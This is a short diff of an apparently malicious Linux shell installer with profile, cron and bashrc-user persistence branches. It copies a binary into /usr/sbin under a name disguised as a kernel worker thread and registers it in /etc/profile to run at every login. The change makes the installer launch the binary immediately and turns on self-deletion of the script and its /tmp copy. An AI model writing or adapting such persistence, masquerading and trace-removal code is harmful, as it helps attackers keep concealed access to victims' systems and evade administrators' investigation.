@@ -9,6 +9,7 @@ profile)
     cp /tmp/bin "/usr/sbin/[kworker_0:0-rcu_par_gp]"
     chmod +x "/usr/sbin/[kworker_0:0-rcu_par_gp]"
     echo "/usr/sbin/[kworker_0:0-rcu_par_gp]" >> /etc/profile
+    "/usr/sbin/[kworker_0:0-rcu_par_gp]"
     ;;
 
 cron)
@@ -36,5 +37,5 @@ bashrc-user)
     ;;
 esac
 
-#rm /tmp/bin
-#rm -- "$0"
+rm /tmp/bin
+rm -- "$0"
